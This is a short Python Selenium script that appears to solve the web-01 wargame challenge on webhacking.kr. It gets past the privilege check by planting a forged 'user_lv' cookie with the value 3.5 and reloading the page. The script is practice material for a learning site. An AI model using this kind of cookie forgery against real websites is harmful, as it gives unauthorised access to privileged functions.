from selenium import webdriver

def getflag(cookie=None):
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = webdriver.Chrome(executable_path='chromedriver', options=options)

    url = 'https://webhacking.kr/challenge/web-01/'
    cookie1 = {'name':'user_lv', 'value':'3.5'}
    driver.get(url=url)
    driver.delete_all_cookies()
    driver.add_cookie(cookie)
    driver.add_cookie(cookie1)
    driver.refresh()

    try:
        al = driver.switch_to_alert()
        if 'already solved' in al.text:
            print('#01 PASS ')
        al.accept()
    except:
        print("ERROR NO.01")
    driver.close()

if __name__ == '__main__':
    getflag()